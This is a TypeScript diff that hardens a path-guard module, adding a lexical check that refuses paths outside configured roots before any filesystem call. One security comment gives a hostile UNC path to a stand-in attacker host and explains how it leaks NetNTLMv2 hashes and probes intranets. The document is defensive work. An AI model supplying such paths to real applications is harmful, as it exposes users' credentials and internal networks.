@@ -1,6 +1,6 @@
 import path from 'path';
 import { realpathSync } from 'fs';
-import { foldPath } from './path-fold';
+import { foldPath, isSameOrDescendantPath } from './path-fold';
 
 /**
  * Roots the renderer has registered as configured locations. Destructive /
@@ -46,14 +46,80 @@ function resolveGuardPath(target: string): string {
 }
 
 /**
- * Throws if `target` is not inside one of the configured location roots.
- * Refuses every write when no roots are configured (no "empty means allow"
- * bypass). Symlinks are resolved before the check to prevent escapes.
+ * Pure string check: is `target` lexically under (or equal to) one of the
+ * configured roots — in the raw renderer-pushed form OR in the symlink-resolved
+ * form (`allowedRoots`)? Never touches the filesystem.
+ *
+ * SECURITY: `resolveGuardPath` runs `realpathSync` on whatever path it is
+ * handed, i.e. the main process TOUCHED the target before anything was
+ * compared against the roots. A compromised renderer — or any MCP client, in
+ * read-only mode, without a single approval — could hand it
+ * `\\attacker.example\s\x`: on Windows the SMB session is opened and
+ * authenticated with the logged-on user's credentials (NetNTLMv2 hash
+ * disclosure), the `\\host@port\s\` form can route through the WebDAV
+ * redirector (when that service runs) to an arbitrary host:port, and the
+ * distinct error text / latency is an intranet oracle. This gate refuses such
+ * a path before any syscall; for paths that ARE under a root the realpath
+ * comparison afterwards still catches symlink escapes.
+ *
+ * `path.resolve` only normalises the string (absolute, `..` collapsed,
+ * separators unified) — no filesystem access. Case follows the platform policy
+ * (`isSameOrDescendantPath`), so `c:\data\x` under root `C:\Data` passes on
+ * Windows/macOS and is refused on Linux exactly like the realpath stage.
  */
-export function assertWithinAllowedRoot(target: string): void {
+function isLexicallyInsideRoots(
+  target: string,
+  extraRoots?: ReadonlySet<string>
+): boolean {
+  let resolved: string;
+  try {
+    resolved = path.resolve(target);
+  } catch {
+    // Non-string / malformed payload: nothing may be touched for it.
+    return false;
+  }
+  for (const root of rawAllowedRoots) {
+    if (isSameOrDescendantPath(root, resolved)) return true;
+  }
+  for (const root of allowedRoots) {
+    if (isSameOrDescendantPath(root, resolved)) return true;
+  }
+  for (const root of extraRoots ?? []) {
+    if (isSameOrDescendantPath(root, resolved)) return true;
+  }
+  return false;
+}
+
+/**
+ * Filesystem-free half of {@link assertWithinAllowedRoot}: throws the same
+ * "Refused" errors when `target` is not even lexically under a configured
+ * root, WITHOUT resolving symlinks. Call it first on paths that would
+ * otherwise be stat'ed / opened before the full guard runs (the
+ * `whale-file://` protocol handler, shell reveal) so an attacker-chosen path
+ * is rejected before anything on disk — or on the network — is touched.
+ */
+export function assertLexicallyWithinAllowedRoot(target: string): void {
   if (allowedRoots.size === 0) {
     throw new Error(`Refused: no configured locations, cannot write ${target}`);
   }
+  if (!isLexicallyInsideRoots(target)) {
+    throw new Error(
+      `Refused: path is outside any configured location (${target})`
+    );
+  }
+}
+
+/**
+ * Throws if `target` is not inside one of the configured location roots.
+ * Refuses every write when no roots are configured (no "empty means allow"
+ * bypass). Symlinks are resolved before the check to prevent escapes.
+ *
+ * Two stages: a lexical gate that never touches the filesystem (see
+ * `isLexicallyInsideRoots` — keeps attacker-supplied UNC paths from ever
+ * reaching `realpathSync`), then the realpath comparison for symlink escapes.
+ */
+export function assertWithinAllowedRoot(target: string): void {
+  assertLexicallyWithinAllowedRoot(target);
   // foldPath: case-fold on case-insensitive FS (win/mac), exact on Linux —
   // see path-fold.ts. Folding on ext4 would let /photos slip under /Photos.
   const norm = foldPath(resolveGuardPath(target));
@@ -73,6 +139,7 @@ export function assertWithinAllowedRoot(target: string): void {
  */
 export function isConfiguredRoot(target: string): boolean {
   if (allowedRoots.size === 0) return false;
+  if (!isLexicallyInsideRoots(target)) return false;
   let norm: string;
   try {
     norm = foldPath(resolveGuardPath(target));
@@ -135,6 +202,9 @@ export function setReadOnlyRoots(roots: string[]): void {
  */
 export function isReadOnlyPath(target: string): boolean {
   if (readOnlyRoots.size === 0) return false;
+  // Outside every root lexically → cannot be inside a read-only one either;
+  // refuse without touching the filesystem (see isLexicallyInsideRoots).
+  if (!isLexicallyInsideRoots(target, readOnlyRoots)) return false;
   let norm: string;
   try {
     norm = foldPath(resolveGuardPath(target));
